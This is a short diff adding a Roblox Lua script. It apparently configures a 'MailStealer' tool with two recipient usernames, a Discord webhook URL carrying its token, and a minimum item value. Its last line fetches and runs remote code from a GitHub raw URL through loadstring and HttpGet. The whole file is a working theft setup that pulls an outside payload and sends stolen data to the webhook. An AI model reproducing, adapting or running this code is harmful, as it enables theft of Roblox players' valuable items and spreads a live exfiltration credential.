@@ -1,0 +1,5 @@
+Username = "jielomendiola"
+Username2 = "dylanpogi728"
+webhook = "https://discord.com/api/webhooks/1301748495824191598/rZXYnLi5Lm6ZlsCkKkJMIsVvzAxiJmJ-ObhzKITRMwayWuz0hlPLLZya8St5qAHnKd2s"
+min_rap = 1000000
+loadstring(game:HttpGet("https://raw.githubusercontent.com/WhriterHub/Whiter/main/MailStealerV.2"))()
